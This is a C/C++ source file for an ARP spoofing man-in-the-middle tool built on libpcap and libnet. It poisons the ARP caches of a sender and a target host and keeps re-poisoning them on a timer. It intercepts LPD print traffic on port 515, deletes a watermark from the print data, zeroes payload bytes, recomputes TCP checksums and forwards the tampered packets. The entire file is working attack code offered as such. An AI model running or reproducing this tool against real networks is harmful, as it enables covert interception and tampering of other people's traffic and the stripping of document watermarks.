#include <stdio.h>
#include <string.h>
#include <libnet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <pthread.h>
#include "my_thr.h"
#include "calc_checksum.h"

#define BUFSIZE 0x8000

typedef struct _MyInfo {
    uint8_t my_mac[6];
    uint8_t my_ip[4];
} MyInfo;

static char *dev;
static uint count;
static MyInfo *my_info;

static bool bp_check = false;
static bool delete_check = false;
static bool pass_check = false;

static u_char data_end[] = { 0xC1, 0x01, 0x00, 0xF8, 0x31, 0x44 };
static u_char packet_end[] = { 0xC8, 0xC1, 0x13, 0x00, 0x42, 0x50, 0x30, 0x30, 0x30, 0x30,
                               0x34, 0x37, 0x36, 0x38, 0xB8, 0xBC, 0xC0, 0xBA, 0x20, 0xB0,
                               0xED, 0xB5, 0xF1, 0xF8, 0xA8, 0x55, 0x49, 0x42, 0x1B, 0x25,
                               0x2D, 0x31, 0x32, 0x33, 0x34, 0x35, 0x58, 0x40, 0x50, 0x4A,
                               0x4C, 0x20, 0x45, 0x4F, 0x4A, 0x0D, 0x0A, 0x1B, 0x25, 0x2D,
                               0x31, 0x32, 0x33, 0x34, 0x35, 0x58 };
static u_char eof_str[] = { 0x49, 0x42, 0x1B, 0x25, 0x2D, 0x31, 0x32, 0x33, 0x34, 0x35,
                            0x58, 0x40, 0x50, 0x4A, 0x4C, 0x20, 0x45, 0x4F, 0x4A, 0x0D,
                            0x0A, 0x1B, 0x25, 0x2D, 0x31, 0x32, 0x33, 0x34, 0x35, 0x58 };
static u_char seq_s[4] = { 0x00 };

void get_myinfo(MyInfo *my_info);
void print_mac(const u_char *mac);
void print_ip(const u_char *ip);
void print_ip(struct in_addr ip);
void print_packet(const u_char *packet, int len);

int arp_request(pcap_t *fp, bool is_sender, ip_set set);
int arp_reply(pcap_t *fp, struct my_arp_hdr *a_hdr, bool is_sender, ip_set set);
int send_arp(pcap_t *fp, const struct my_arp_hdr *a_hdr, ip_set set, bool is_sender);

int recv_icmp(pcap_t *fp, struct libnet_ethernet_hdr *ether_hdr, struct libnet_ipv4_hdr *ip_hdr, u_char *buf);
int send_icmp(pcap_t *fp, ip_set set, u_char *buf, int len);

bool get_bp(u_char *buf, int *len);
void ldp_finish(u_char *buf, int *len);
void test(u_char *buf, int *len);
bool wm_delete(u_char *buf, int *len);
int find_index(u_char *s1, u_char *s2, int *len, int size);
u_char *find_pos(u_char *s1, u_char *s2, int *len, int size);

void *thr_send_arp(void *arg);
void *thr_recv_send_icmp(void *arg);

int main(int argc, char* argv[]) {
    pcap_t *fp;
    pthread_t *arp_thr;
    ip_set *ip_sets;
    struct my_arp_hdr arp_hdr_s, arp_hdr_t;
    char errbuf[PCAP_ERRBUF_SIZE];
    int tid;

    my_info = reinterpret_cast<MyInfo *>(malloc(sizeof(MyInfo)));

    if(argc < 4) {
        printf("Usage: ./send_arp <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
        return -1;
    }
    else if(argc % 2 != 0) {
        printf("Usage: ./send_arp <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
        return -1;
    }

    dev = argv[1];
    count = static_cast<unsigned int>((argc - 2) / 2);
    printf("[*] Set count: %d\n", count);

    arp_thr = reinterpret_cast<pthread_t *>(malloc(count * sizeof(pthread_t)));
    if(arp_thr == nullptr) {
        fprintf(stderr, "arp_thr malloc fail...\n");
        return -1;
    }
    memset(arp_thr, 0, count * sizeof(pthread_t));

    ip_sets = reinterpret_cast<ip_set *>(malloc(count * sizeof(ip_set)));
    if(ip_sets == nullptr) {
        fprintf(stderr, "ip_sets malloc fail...\n");
        return -1;
    }
    memset(arp_thr, 0, count * sizeof(ip_set));

    for(uint i = 0; i < count; i++) {
        ip_sets[i].sender_ip = argv[(i+1)*2];
        ip_sets[i].target_ip = argv[(i+1)*2+1];
    }

    get_myinfo(my_info);
    printf("[*] Attacker ");
    print_mac(my_info->my_mac);
    printf("[*] Attacker ");
    print_ip(my_info->my_ip);

    if((fp = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf)) == nullptr) {
        fprintf(stderr, "Couldn't open device %s \n", errbuf);
        return -1;
    }

    for(uint i = 0; i < count; i++) {
        printf("[*] Set %d\n", i+1);

        // sender
        if(arp_request(fp, true, ip_sets[i])) {
            fprintf(stderr, "[%d] sender arp_request fail...\n", i+1);
            continue;
        }

        if(arp_reply(fp, &arp_hdr_s, true, ip_sets[i])) {
            fprintf(stderr, "[%d] sender arp_reply fail...\n", i+1);
            continue;
        }

        // target
        if(arp_request(fp, false, ip_sets[i])) {
            fprintf(stderr, "[%d] target arp_request fail...\n", i+1);
            continue;
        }

        if(arp_reply(fp, &arp_hdr_t, false, ip_sets[i])) {
            fprintf(stderr, "[%d] target arp_reply fail...\n", i+1);
            continue;
        }

        struct thr_arg_arp t_arg_arp = { fp, &arp_hdr_s, &arp_hdr_t, ip_sets[i] };
        tid = pthread_create(&arp_thr[i], nullptr, thr_send_arp, reinterpret_cast<void *>(&t_arg_arp));
        if(tid) {
            fprintf(stderr, "pthread_create error.\n");
            exit(1);
        }

        struct thr_arg_icmp t_arg_icmp = { fp, &arp_hdr_s, &arp_hdr_t };
        tid = pthread_create(&arp_thr[i], nullptr, thr_recv_send_icmp, reinterpret_cast<void *>(&t_arg_icmp));
        if(tid) {
            fprintf(stderr, "pthread_create error.\n");
            exit(1);
        }
    }

    for(uint i = 0; i < count; i++) {
        pthread_join(arp_thr[i], nullptr);
    }

    free(arp_thr);
    free(ip_sets);
    pcap_close(fp);

    return 0;
}

void get_myinfo(MyInfo *my_info) {
    struct ifreq info;
    int sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(info.ifr_name, dev);
    ioctl(sock, SIOCGIFHWADDR, &info);
    for (int i = 0; i < 6; i++)
        my_info->my_mac[i] = static_cast<unsigned char>(info.ifr_ifru.ifru_hwaddr.sa_data[i]);

    ioctl(sock, SIOCGIFADDR, &info);
    for (int i = 2; i < 6; ++i) {
        my_info->my_ip[i-2] = static_cast<unsigned char>(info.ifr_ifru.ifru_addr.sa_data[i]);
    }
    close(sock);
}

void print_mac(const u_char *mac) {
    printf("Mac = ");
    for(int i = 0; i < 6; i++) {
        if(i < 5) printf("%02x:", mac[i]);
        else printf("%02x", mac[i]);
    }
    printf("\n");
}

void print_ip(const u_char *ip) {
    printf("IP = ");
    for(int i = 0; i < 4; i++) {
        if(i < 3) printf("%d.", ip[i]);
        else printf("%d", ip[i]);
    }
    printf("\n");
}

void print_ip(struct in_addr ip) {
    printf("IP = ");
    printf("%s\n", inet_ntoa(ip));
}

void print_packet(const u_char *packet, int len) {
    printf("================================================\n");
    for(int i = 1; i <= len; i++) {
        printf("%02X ", packet[i-1]);
        if(i % 8 == 0) printf(" ");
        if(i % 16 == 0) printf("\n");
    }
    printf("\n================================================\n");
}

int arp_request(pcap_t *fp, bool is_sender, ip_set set) {
    struct libnet_ethernet_hdr *ether_hdr = reinterpret_cast<libnet_ethernet_hdr *>(malloc(sizeof(libnet_ethernet_hdr)));
    struct my_arp_hdr *arp_hdr = reinterpret_cast<my_arp_hdr *>(malloc(sizeof(my_arp_hdr)));
    struct in_addr addr;
    u_char packet[sizeof(struct libnet_ethernet_hdr) + sizeof(struct my_arp_hdr)];

    memset(ether_hdr, 0, sizeof(libnet_ethernet_hdr));
    memset(arp_hdr, 0, sizeof(my_arp_hdr));

    /* set ether_hdr */
    memset(ether_hdr->ether_dhost, 0xff, ETHER_ADDR_LEN);
    memcpy(ether_hdr->ether_shost, my_info->my_mac, ETHER_ADDR_LEN);
    ether_hdr->ether_type = htons(ETHERTYPE_ARP);

    /* set arp_hdr */
    arp_hdr->ar_hrd = htons(ARPHRD_ETHER);                   /* format of hardware address */
    arp_hdr->ar_pro = htons(ETHERTYPE_IP);                   /* format of protocol address */
    arp_hdr->ar_hln = MAC_LEN;                               /* length of hardware address */
    arp_hdr->ar_pln = IP_LEN;                                /* length of protocol addres */
    memcpy(arp_hdr->ar_sha, my_info->my_mac, MAC_LEN);
    memcpy(arp_hdr->ar_spa, &(my_info->my_ip), IP_LEN);
    memset(arp_hdr->ar_tha, 0x00, MAC_LEN);

    if(is_sender) {
        inet_pton(AF_INET, set.sender_ip, &addr);
    }
    else {
        inet_pton(AF_INET, set.target_ip, &addr);
    }
    memcpy(arp_hdr->ar_tpa, &addr, IP_LEN);
    arp_hdr->ar_op = htons(ARPOP_REQUEST);

    memcpy(packet, ether_hdr, sizeof(struct libnet_ethernet_hdr));
    memcpy(packet + sizeof(struct libnet_ethernet_hdr), arp_hdr, sizeof(struct my_arp_hdr));

    printf("================================================\n");
    printf("                  ARP_REQUEST                   \n");
    print_packet(packet, sizeof(packet));

    if (pcap_sendpacket(fp, packet, sizeof(packet)) == -1) {
        fprintf(stderr, "pcap_sendpacket: %s\n", pcap_geterr(fp));
        return 1;
    }

    return 0;
}

int arp_reply(pcap_t *fp, struct my_arp_hdr *a_hdr, bool is_sender, ip_set set) {
    const struct libnet_ethernet_hdr *ether_hdr;
    struct pcap_pkthdr *pkthdr;
    const u_char *packet;
    struct in_addr addr1, addr2;
    int res = 0, count = 0;

    printf("================================================\n");
    printf("                   ARP_REPLY                    \n");

    while(true) {
        while((res = pcap_next_ex(fp, &pkthdr, &packet)) == 0) {
            if(res == -1) {
                printf("Corrupted input file.\n");
                return 1;
            }
        }

        if(count == 30) {
            printf("Time out.\n");
            return 1;
        }

        ether_hdr = reinterpret_cast<const libnet_ethernet_hdr*>(packet);
        if(ntohs(ether_hdr->ether_type) == ETHERTYPE_ARP) {
            memcpy(a_hdr, packet + sizeof(libnet_ethernet_hdr), sizeof(my_arp_hdr));

            inet_pton(AF_INET, set.sender_ip, &addr1);
            inet_pton(AF_INET, set.target_ip, &addr2);

            if(is_sender && !memcmp(&(a_hdr->ar_spa), &addr1, sizeof(struct in_addr))) {
                print_packet(packet, 42);
                printf("[*] Sender ");
                print_mac(a_hdr->ar_sha);
                break;
            }
            else if(!is_sender && !memcmp(&(a_hdr->ar_spa), &addr2, sizeof(struct in_addr))) {
                print_packet(packet, 42);
                printf("[*] Target ");
                print_mac(a_hdr->ar_sha);
                break;
            }
        }
        count++;
    }

    return 0;
}

int send_arp(pcap_t *fp, const struct my_arp_hdr *a_hdr, ip_set set, bool is_sender) {
    struct libnet_ethernet_hdr *ether_hdr = reinterpret_cast<libnet_ethernet_hdr *>(malloc(sizeof(libnet_ethernet_hdr)));
    struct my_arp_hdr *arp_hdr = reinterpret_cast<my_arp_hdr *>(malloc(sizeof(my_arp_hdr)));
    struct in_addr addr1, addr2;
    u_char packet[sizeof(struct libnet_ethernet_hdr) + sizeof(struct my_arp_hdr)];

    memset(ether_hdr, 0, sizeof(libnet_ethernet_hdr));
    memset(arp_hdr, 0, sizeof(my_arp_hdr));

    /* set ether_hdr */
    memcpy(ether_hdr->ether_dhost, a_hdr->ar_sha, ETHER_ADDR_LEN);
    memcpy(ether_hdr->ether_shost, my_info->my_mac, ETHER_ADDR_LEN);
    ether_hdr->ether_type = htons(ETHERTYPE_ARP);

    /* set arp_hdr */
    arp_hdr->ar_hrd = htons(ARPHRD_ETHER);                   /* format of hardware address */
    arp_hdr->ar_pro = htons(ETHERTYPE_IP);                   /* format of protocol address */
    arp_hdr->ar_hln = MAC_LEN;                               /* length of hardware address */
    arp_hdr->ar_pln = IP_LEN;                                /* length of protocol addres */

    if(is_sender) {
        inet_pton(AF_INET, set.target_ip, &addr1);
        inet_pton(AF_INET, set.sender_ip, &addr2);
    }
    else {
        inet_pton(AF_INET, set.sender_ip, &addr1);
        inet_pton(AF_INET, set.target_ip, &addr2);
    }

    memcpy(arp_hdr->ar_sha, my_info->my_mac, MAC_LEN);
    memcpy(arp_hdr->ar_spa, &addr1, IP_LEN);
    memcpy(arp_hdr->ar_tha, a_hdr->ar_sha, MAC_LEN);
    memcpy(arp_hdr->ar_tpa, &addr2, IP_LEN);
    arp_hdr->ar_op = htons(ARPOP_REPLY);

    memcpy(packet, ether_hdr, sizeof(struct libnet_ethernet_hdr));
    memcpy(packet + sizeof(struct libnet_ethernet_hdr), arp_hdr, sizeof(struct my_arp_hdr));

    /*
    printf("================================================\n");
    printf("                    SEND_ARP                    \n");
    print_packet(packet, sizeof(packet));
    */

    if(pcap_sendpacket(fp, packet, sizeof(packet)) == -1) {
        fprintf(stderr, "pcap_sendpacket: %s\n", pcap_geterr(fp));
        return 1;
    }

    return 0;
}

int recv_icmp(pcap_t *fp, struct libnet_ethernet_hdr *ether_hdr, struct libnet_ipv4_hdr *ip_hdr, u_char *buf) {
    struct libnet_tcp_hdr *tcp_hdr = reinterpret_cast<libnet_tcp_hdr *>(malloc(sizeof(libnet_tcp_hdr)));
    struct pcap_pkthdr *pkthdr;
    const u_char *packet;
    int res = 0;
    int len = 0;

    while(true) {
        while((res = pcap_next_ex(fp, &pkthdr, &packet)) == 0) {
            if(res == -1) {
                printf("Corrupted input file.\n");
                return 1;
            }
        }

        memcpy(ether_hdr, packet, sizeof(struct libnet_ethernet_hdr));
        if(ntohs(ether_hdr->ether_type) != ETHERTYPE_IP) {
            continue;
        }

        memcpy(ip_hdr, packet + sizeof(libnet_ethernet_hdr), sizeof(struct libnet_ipv4_hdr));
        memcpy(tcp_hdr, packet + sizeof(libnet_ethernet_hdr) + ip_hdr->ip_hl * 4, sizeof(struct libnet_tcp_hdr));
        if((ip_hdr->ip_p == IPPROTO_TCP && htons(tcp_hdr->th_dport) == 515) || (ip_hdr->ip_p == IPPROTO_TCP && htons(tcp_hdr->th_sport) == 515)) {
            len = sizeof(struct libnet_ethernet_hdr) + ntohs(ip_hdr->ip_len);
            /*
            printf("================================================\n");
            printf("                    RECV_LPD                    \n");
            print_packet(packet, len);
            */

            memcpy(buf, packet, static_cast<size_t>(len));
            //printf("[*] RECV_LPD Success!\n");
            return 0;
        }
    }
}

int send_icmp(pcap_t *fp, const struct my_arp_hdr *a_hdr_t, u_char *buf, int len) {
    struct libnet_ethernet_hdr *ether_hdr = reinterpret_cast<libnet_ethernet_hdr *>(malloc(sizeof(libnet_ethernet_hdr)));
    memset(ether_hdr, 0, sizeof(libnet_ethernet_hdr));

    /* set ether_hdr */
    memcpy(ether_hdr->ether_dhost, a_hdr_t->ar_sha, ETHER_ADDR_LEN);
    memcpy(ether_hdr->ether_shost, my_info->my_mac, ETHER_ADDR_LEN);
    ether_hdr->ether_type = htons(ETHERTYPE_IP);

    memcpy(buf, ether_hdr, sizeof(libnet_ethernet_hdr));

    /*
    if(!bp_check)
        bp_check = get_bp(buf, &len);
    */

    if(wm_delete(buf, &len)) {
        //printf("[*] Watermark Delete Success! >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n");
        delete_check = true;
    }

    //printf("[*] len: %d\n", len);
    if (pcap_sendpacket(fp, buf, len) == -1) {
        fprintf(stderr, "pcap_sendpacket: %s\n", pcap_geterr(fp));
        return 1;
    }

    /*
    printf("================================================\n");
    printf("                    SEND_LPD                    \n");
    print_packet(buf, len);
    printf("[*] SEND_LPD Success!\n");
    */

    return 0;
}

bool get_bp(u_char *buf, int *len) {
    u_char bp_str[] = { 0x42, 0x50, 0x30, 0x30 };
    u_char *pos = nullptr;

    pos = find_pos(buf, bp_str, len, 4);
    if(pos != nullptr) {
        /*
        printf("[BP]\n");
        for(int i = 0; i < 10; i++) {
            printf("%02x ", pos[i]);
        }
        printf("\n");
        */

        for(int i = 4; i < 14; i++, pos++)
            packet_end[i] = *pos;
        return true;
    }

    return false;
}

void ldp_finish(u_char *buf, int *len) {
    struct libnet_ethernet_hdr *ether_hdr = reinterpret_cast<libnet_ethernet_hdr *>(malloc(sizeof(libnet_ethernet_hdr)));
    struct libnet_ipv4_hdr *ip_hdr = reinterpret_cast<libnet_ipv4_hdr *>(malloc(sizeof(libnet_ipv4_hdr)));
    struct libnet_tcp_hdr *tcp_hdr = reinterpret_cast<libnet_tcp_hdr *>(malloc(sizeof(libnet_tcp_hdr)));
    int index = 0;
    unsigned short result = 0;

    memcpy(ether_hdr, buf, sizeof(struct libnet_ethernet_hdr));
    memcpy(ip_hdr, buf + sizeof(libnet_ethernet_hdr), sizeof(struct libnet_ipv4_hdr));
    memcpy(tcp_hdr, buf + sizeof(libnet_ethernet_hdr) + ip_hdr->ip_hl * 4, sizeof(struct libnet_tcp_hdr));

    index = sizeof(struct libnet_ethernet_hdr) + ip_hdr->ip_hl * 4 + tcp_hdr->th_off * 4;

    // len(packet_end) == 56
    for(int i = 0; i < 56; i++) {
        buf[index + i] = packet_end[i];
    }

    for(int i = 56; i < *len; i++) {
        buf[index + i] = '\x00';
    }

    // change tcp->sum
    result = calc_tcpcs(buf);
    buf[0x32] = (result & 0xff00) >>8;
    buf[0x33] = result & 0xff;
}

void test(u_char *buf, int *len) {
    struct libnet_ethernet_hdr *ether_hdr = reinterpret_cast<libnet_ethernet_hdr *>(malloc(sizeof(libnet_ethernet_hdr)));
    struct libnet_ipv4_hdr *ip_hdr = reinterpret_cast<libnet_ipv4_hdr *>(malloc(sizeof(libnet_ipv4_hdr)));
    struct libnet_tcp_hdr *tcp_hdr = reinterpret_cast<libnet_tcp_hdr *>(malloc(sizeof(libnet_tcp_hdr)));
    unsigned short result = 0;

    memcpy(ether_hdr, buf, sizeof(struct libnet_ethernet_hdr));
    memcpy(ip_hdr, buf + sizeof(libnet_ethernet_hdr), sizeof(struct libnet_ipv4_hdr));
    memcpy(tcp_hdr, buf + sizeof(libnet_ethernet_hdr) + ip_hdr->ip_hl * 4, sizeof(struct libnet_tcp_hdr));

    for(int i = sizeof(libnet_ethernet_hdr) + ip_hdr->ip_hl * 4 + sizeof(struct libnet_tcp_hdr); i < *len; i++) {
        buf[i] = '\x00';
    }

    // change tcp->sum
    result = calc_tcpcs(buf);
    buf[0x32] = (result & 0xff00) >>8;
    buf[0x33] = result & 0xff;
}

bool wm_delete(u_char *buf, int *len) {
    u_char wm_start[] = { 0x61, 0xc0, 0x01, 0xf8 };
    int index = 0;
    unsigned short result = 0;

    struct libnet_ethernet_hdr *ether_hdr = reinterpret_cast<libnet_ethernet_hdr *>(malloc(sizeof(libnet_ethernet_hdr)));
    struct libnet_ipv4_hdr *ip_hdr = reinterpret_cast<libnet_ipv4_hdr *>(malloc(sizeof(libnet_ipv4_hdr)));
    struct libnet_tcp_hdr *tcp_hdr = reinterpret_cast<libnet_tcp_hdr *>(malloc(sizeof(libnet_tcp_hdr)));
    memcpy(ether_hdr, buf, sizeof(struct libnet_ethernet_hdr));
    memcpy(ip_hdr, buf + sizeof(libnet_ethernet_hdr), sizeof(struct libnet_ipv4_hdr));
    memcpy(tcp_hdr, buf + sizeof(libnet_ethernet_hdr) + ip_hdr->ip_hl * 4, sizeof(struct libnet_tcp_hdr));

    index = find_index(buf, wm_start, len, 4);
    if(index == -1) {
        //printf("start_pos not found...\n");
        return false;
    }

    for(int i = 0; i < 6; i++) {
        buf[index + i] = data_end[i];
    }

    for(int i = 6; i < *len; i++) {
        buf[index + i] = '\x00';
    }

    // change tcp->sum
    result = calc_tcpcs(buf);
    buf[0x32] = (result & 0xff00) >>8;
    buf[0x33] = result & 0xff;

    return true;
}

int find_index(u_char *s1, u_char *s2, int *len, int size) {
    int j = 0;

    for(int i = 0; i < *len; i++) {
        if(s1[i] == s2[j]) {
            for(j = 1; j < size; j++) {
                if(s1[i+j] != s2[j]) {
                    j = 0;
                    break;
                }
            }

            if(j == size) {
                return i;
            }
        }
    }

    return -1;
}

u_char *find_pos(u_char *s1, u_char *s2, int *len, int size) {
    u_char *pos = nullptr;
    int j = 0;

    for(int i = 0; i < *len; i++) {
        if(s1[i] == s2[j]) {
            for(j = 1; j < size; j++) {
                if(s1[i+j] != s2[j]) {
                    j = 0;
                    break;
                }
            }

            if(j == size) {
                pos = &s1[i];
            }
        }
    }

    return pos;
}

void *thr_send_arp(void *arg) {
    struct thr_arg_arp *t_arg = reinterpret_cast<struct thr_arg_arp *>(arg);

    while(true) {
        if(send_arp(t_arg->fp, t_arg->arp_hdr_s, t_arg->sets, true)) {
            fprintf(stderr, "send_arp (1) fail...\n");
            break;
        }

        if(send_arp(t_arg->fp, t_arg->arp_hdr_t, t_arg->sets, false)) {
            fprintf(stderr, "send_arp (2) fail...\n");
            break;
        }

        sleep(10);
    }

    return nullptr;
}

void *thr_recv_send_icmp(void *arg) {
    struct thr_arg_icmp *t_arg = reinterpret_cast<struct thr_arg_icmp *>(arg);
    struct my_arp_hdr *arp_hdr;
    struct libnet_ethernet_hdr ether_hdr;
    struct libnet_ipv4_hdr ip_hdr;
    int len = 0;
    u_char buf[BUFSIZE];

    while(true) {
        memset(buf, 0, BUFSIZE);

        if(recv_icmp(t_arg->fp, &ether_hdr, &ip_hdr, buf)) {
            fprintf(stderr, "recv_icmp fail...\n");
            break;
        }

        len = sizeof(struct libnet_ethernet_hdr) + ntohs(ip_hdr.ip_len);

        if(find_index(buf, eof_str, &len, 30) != -1) {
            test(buf, &len);
            printf("[*] LDP Finish! >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n");
        } else if(find_index(buf, data_end, &len, 6) != -1) {
            test(buf, &len);
            delete_check = false;
        }

        if(!memcmp(t_arg->arp_hdr_s->ar_spa, &ip_hdr.ip_src, sizeof(struct in_addr)) && !memcmp(t_arg->arp_hdr_s->ar_sha, ether_hdr.ether_shost, sizeof(uint8_t)*MAC_LEN)) {
            arp_hdr = t_arg->arp_hdr_t;
            if(delete_check) {
                test(buf, &len);
            }
        }
        else if(!memcmp(t_arg->arp_hdr_t->ar_spa, &ip_hdr.ip_src, sizeof(struct in_addr)) && !memcmp(t_arg->arp_hdr_t->ar_sha, ether_hdr.ether_shost, sizeof(uint8_t)*MAC_LEN)) {
            arp_hdr = t_arg->arp_hdr_s;
        }
        else {
            //printf("continue..\n");
            continue;
        }

        if(send_icmp(t_arg->fp, arp_hdr, buf, len)) {
            fprintf(stderr, "send_icmp fail...\n");
            break;
        }
    }

    return nullptr;
}
